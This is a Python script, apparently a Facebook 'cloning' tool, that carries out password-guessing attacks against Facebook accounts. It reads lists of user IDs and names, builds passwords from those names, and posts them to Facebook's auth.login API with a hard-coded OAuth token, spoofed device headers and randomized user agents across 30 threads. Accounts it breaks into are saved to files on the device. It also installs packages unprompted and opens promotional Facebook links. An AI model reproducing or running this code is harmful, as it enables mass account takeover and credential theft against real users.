fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
tan=('https')
iya=('github')
ani=('Fariya')
love=('mbasic')
ugen=[]
ugen=[]
useragent=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	useragent.append(uakua)

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python HLS.py')
print('[✓] Join our Facebook Group')
os.system('xdg-open  https://facebook.com/groups/2526235434185264/')
try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;95m[√] please wait loading..... ')
	
proxies=open('proxies.txt','r').read().splitlines()
mafia = ['Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.29 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N986U1 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]','Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]','Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 EdgA/111.0.1661.38','Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/398.1.0.11.69;]','Mozilla/5.0 (Linux; Android 10; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Mobile Safari/537.36 EdgA/88.0.705.53','Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/398.1.0.11.69;]']
ua = random.choice(mafia)
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

logo=("""\033[1;92m
                        💥💥AFGHNISTAN💥💥

\033[1;92m(+) Author   :  WAHID🌟
\033[1;91m(+) STATES   :   PREMIUM 
\033[1;92m(+) Facebook :   WAHID❤
\033[1;92m(+) Version  :    #open source code
\033[1;97m==========================================================
\033[33;41m RAMADAN KARIM MUBARAK TO WORLD ALL MUSLIMS \033[0;m
\033[1;97m==========================================================""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
import os
import requests
import sys
import time
# End of the code


def menu():
			clear()
			linex()
			print('[1] RANDOM CLONING \n[2] FILE CLONING \n[3] GET TEMP-MAIL \n[4] FACEBOOK GROUP\n[E] EXIT PROGRAM')
			linex()
			xd=input(' Choose an option: ')
			os.system('xdg-open   https://www.facebook.com/profile.php?id=100071596264601')
			if xd in ['1','01']:
				pak()
			if xd in ['02','2']:
				Spy()
			if xd in ['03','3']:
				os.system('xdg-open https://github.com/HLS706/Temp-maill')
			if xd in ['04','4']:
				os.system('xdg-open  https://facebook.com/groups/2526235434185264/')
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python HLS.py')
				#create()
				#dz._login()
				exit()
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
				exit(' Option not found in menu...')
def Spy():
		clear()
		file = input(f' INTER YOUR FILE PATH\033[1;37m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' File location not found ')
			exit()
		mthd= ('1')
		plist=[]
		try:
			ps_limit = int(input(f' HOW MANY PASSWORDS DO YOU WANT ADD ? '))
		except:
			ps_limit =1
		print(f'\033[1;32m EXAMPLE: FIRST LAST, FIRST123,FIRSTLAST')
		for i in range(ps_limit):
			plist.append(input(f' INTER PASSWORD{i+1}: '))
		print(f' DO YOU WANT  TO SHOW CP ACC? (Y/N): ')
		cx=input(f' Choose: ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f' TOTAL IDS : \033[1;32m'+total_ids+f' \n\033[1;37mMethod > \033[1;37mM{mthd}')
			print(f"\033[ USE AIROPLAN MODE FOR SPEED ON\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(api,ids,names,passlist)
				else:
					crack_submit.submit(api,ids,names,passlist)

xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [HLS-FILE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace(f'first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5358a [FBAN/FBIOS;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/2;FBID/phone;FBLC/de_DE;FBOP/5]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 1348564698517390|007c0a9101b9e1c8ffab727666805038',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [HLS-LIVE] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/HLS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[31;5;126m [HLS-DIED] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/HLS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
